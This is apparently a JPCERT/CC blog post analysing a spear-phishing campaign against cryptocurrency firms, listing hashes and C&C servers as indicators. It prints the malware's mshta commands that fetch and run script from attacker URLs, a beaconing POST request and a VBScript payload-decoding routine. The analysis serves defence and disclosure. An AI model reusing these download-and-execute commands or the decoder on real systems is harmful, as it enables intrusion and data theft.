These emails contain a URL to a cloud service and convince recipients to\ndownload a zip file which contains a malicious shortcut file. This article will describe the\ndetails of the attack method.\n\n### How the VBScript downloader is launched\n\nThe zip file downloaded from the URL in the email contains a password-protected decoy\ndocument and a shortcut file “Password.txt.lnk”. This shortcut file contains some commands,\nand they run when the file is executed. The below image illustrates the flow of events from\nthe shortcut file being executed until the VBScript-based downloader is launched.\n\n\n-----\n\nFigure 1： Flow of\n\nevents from running the shortcut file to infecting a host\nThe shortcut file contains the following command:\n```\nC:\\Windows\\System32\\mshta.exe https://bit.ly/31O88c3\n\n```\nWhen a user accesses the shortened URL, they will be redirected to the following site, and\nan HTML file containing the VBScript (Figure 2) is downloaded.\n```\nhttp://service.amzonnews.club:8080/open?\nid=3F%2BE7HwXzwMRiysADDAgev15bAPluuPYB%2BufUnqYMCw%3D\n\n```\n\n-----\n\nFigure 2： HTML file downloaded by the shortcut file\nThe behaviour of the VBScript is described in Figure 3. First, it creates and displays a text\nfile that contains the password for the decoy document. Then, it creates a VBS file\n(oezjrjua.vbs) in %TEMP% directory and executes it. It also lists the processes running in the\nenvironment and checks whether any of them contains specific strings (\"hudongf\" or\n\"qhsafe\"). If these are not included, then a shortcut file (xBoxOne.lnk) is created in the\nStartup folder. It is assumed that this process is meant to check strings that Qihoo 360\nsecurity products contain (zhudongfangyu.exe, qhsafemain.exe).\n\n\n-----\n\nFigure 3： Behaviour of VBScript in the HTML\n\nfile\n\n**Details of xBoxOne.lnk**\n\nxBoxOne.lnk is a shortcut file and contains the following command:\n```\nC:\\Windows\\System32\\mshta.exe https://bit.ly/2SGs76y\n\n```\nWhen a user accesses the shortened URL, they will be redirected to the following site:\n```\nhttp://update.gdrives.top:8080/open?\nid=b7hMO0D%2ByNbNZSqXu4Putub%2BZLLqg/S66Foz0YKUjety914cQmWz32MV6BE44pEd\n\n```\nThis shortcut file is created in the Startup folder and executed when the login is processed.\nAs of 26 June 2019, JPCERT/CC was not able to confirm the details of the site as the\nhostname could not be resolved.\n\n**Details of oezjrjua.vbs**\n\noezjrjua.vbs is a downloader which sends a POST request every 3 minutes and executes the\nreceived data as VBScript. The following is an example.\n\n\n-----\n\n```\nPOST /open?topics s9[random 3 digit numeric]\nHTTP/1.1\nAccept: */*\nAccept-Language: ja\nUA-CPU: AMD64\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64;\nTrident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR\n3.5.30729)\nHost: 75.133.9.84:8080\nContent-Length: 7426\nConnection: Keep-Alive\nCache-Control: no-cache\n200\n\n```\n**Details of VBScript downloaded by oezjrjua.vbs**\n\nJPCERT/CC has confirmed that the VBScript (Figure 4) is received and executed in\nresponse to the POST request from oezjrjua.vbs.\n\n\n-----\n\nFigure 4：VBScript executed by oezjrjua.vbs (snipped)\nThe executed VBScript collects information of the infected device and sends it to the\nattacker’s server every minute. The following information is sent:\n\nUsername\nHost name\n\n\n-----\n\nOS version\nOS install date\nOS run time\nTime zone\nCPU name\nExecution path of oezjrjua.vbs\nNetwork adapter information\nList of running processes\n\nIf the response to the data contains “20”, encoded data will be downloaded. It can be\ndecoded with the following codes:\n```\nn=InStr(1,res,\"#\")          // Finds # in the response\nkey=CLng(\"&h\" & Mid(res,1,n-1))  // Extract the key\npsc=Mid(ret,n+1,Len(res)-n)    // Extracts encoded data\nsc=base64dec(psc)          // Base64 decoding (1st time)\npsc=CStr(xor(sc,key))        // XOR processing on the key\nNStep=base64dec(psc)        // Base64 decoding (2nd time)\n\n```\nThe decoded data is expected to be VBScript, and it will be executed when it is correctly\ndecoded. As of now, we have no clue about what kind of malware will be downloaded as a\nresult since the encoded data is not accessible. It is assumed that attackers would inject\nsome malicious files according to the victim’s environmental information .\n\n### Access to the shortened URL\n\nJPCERT/CC observed a limited number of access to the shortened URL (Figure 5). This\nimplies that the attack was conducted against a very limited range of targets.\n\nFigure 5： Access counts to the shortened URL (snipped)\n\n### In closing\n\nIn this series of attacks, we have observed that attackers change some parts of encoding\nand conditions for each attempt. It is likely that this type of attack continues with some\ncustomisation. Details about the shortcut file is available in Appendix A, list of samples in\n\n\n-----\n\nAppendix B and C&C servers in Appendix C.\n\nThe hash values and C&C servers of some variants are listed in Appendix D and E . Please\nmake sure that none of your devices is communicating to the C&C servers listed in Appendix\nC or E. These samples were mostly decoy documents with subjects about cryptocurrency.\nWe are aware that some of these documents have been sent to organisations that are\nrelated to cryptocurrencies. We assume that this attack campaign specifically targets\ncryptocurrency operators and related entities.\n\nTomoaki Tani\n_(Translated by Yukako Uchida)_\n\n**Appendix A Shortcut file information**\n\nTable 1: Information contained in the shortcut file 1\n\nDrive serial number fe42-66e0\n\nNetBIOS name desktop-6hpdfg4\n\nMAC address 94:b8:6d:42:68:1d\n\nTable 2: Information contained in the shortcut file 2\n\nDrive serial number 1aee-e0bd\n\nNetBIOS name desktop-m9r59ro\n\nMAC address 74:27:ea:25:d6:11\n\n**Appendix B SHA-256 Hash value of the samples**\n\n71346d2cb7ecf45d7fe221ede76da51a2ecb85110b9b27f1cb64c30f9af69250\n01b5cd525d18e28177924d8a7805c2010de6842b8ef430f29ed32b3e5d7d99a0\n10ce173cfe83321b44139e3d7d20c5ac1a9c1c99882387af0fdbadcfa2597651\ndc5f81c5bf0f5905ff2b6bdc4e1171fc41ad736da265801a64bb821bd76eace9\n9ad472872ba20c66fad56b7340ae869ff4d6708a2d0fc275a0faaded6ab7b507\nde7fde10fabf91c03cdd894e40a19e664a9f9866932a801e57f1b79088847ebd\n4ecab0f81a2da70df5f2260bab7c8c130b200dbfe2bbd8e3d1845ff0c93c7861\ne982a70cb21c915d847925bd364d6d87f02eac135eac3ba80ad448700e1ae9a7\n\n**Appendix C List of C&C servers**\n\nservice.amzonnews.club\n75.133.9.84\nupdate.gdrives.top\n\n\n-----\n\ngoogledrive.network\n\n**Appendix D SHA-256 Hash value of the similar samples**\n\n901eca85c5711a53e53c48309b3afd34cbb014c91a20f8f716ee21832c7cd5e0\nc60aedbb20fdea048fa2d4b3bdc520f9f9b9172ee16c01dac19b33781b1bdb1d\n7446efa798cfa7908e78e7fb2bf3ac57486be4d2edea8a798683c949d504dee6\n1533374acf886bc3015c4cba3da1c67e67111c22d00a8bbf7694c5394b91b9fc\nb077edc8d08796cdff8b75e5cb66e0191510a559941b431e38040e51b6607876\n997c4f7695a6a615da069d5f839582fdb83f215bc999e8af492636b2b5e3436c\na464781b616c86bbd68dbf909826444f7fd6c6ae378caf074926df7aebc4e3a1\n\n**Update: Nov 20, 2019**\n\n122674a261ac7061c8a304f3e4a1fb13023f39102e5605e30f7aad0ab388dfa0\n57278dab6a0e8438444996503a6528ff8a816be0060d5e5db7a6ab1a0d6122f1\n9b20767b11f7e54644104d455aa25c6a0fc99ce9d7b39b98408f8687209585e2\nd70988e43ebc4981e880489b11b6c374d466ef04803f9c2e084af037049cfd04\nf9e299c562195513968be88c6096957494cf15195a05c4abc907520eff872332\n7dcbeb1806296739acfa5819872e8d9669a9c60be1fc96be9cb73ca519917ae8\n\n**Appendix E C&C servers of the similar samples**\n\ndrverify.dns-cloud.net\ndocs.googlefiledrive.com\neuropasec.dnsabr.com\neu.euprotect.net\n092jb_378v3_1.googldocs.org\ngbackup.gogleshare.xyz\ndrive.gogleshare.xyz\n\n**Update: Nov 20, 2019**\n\ndown.financialmarketing.live\ndrivegoogle.publicvm.com\ngoogledrive.publicvm.com\nmskpupdate.publicvm.com\ngoogledrive.email\niellsfileshare.sharedrivegght.xyz\ndownload.showprice.xyz\ndowns.showprice.xyz\nmdown.showprice.xyz\nstart.showprice.xyz\nu13580130.ct.sendgrid.net\n\n\n-----\n\n[Email](http://10.10.0.46/mailto:?subject=Spear%20Phishing%20against%20Cryptocurrency%20Businesses&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2019%2F07%2Fspear-phishing-against-cryptocurrency-businesses.html)\n\nAuthor\n\n[JPCERT/CC](https://blogs.jpcert.or.jp/en/retiree_blog/)\n\nPlease use the below contact form for any inquiries about the article.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries.
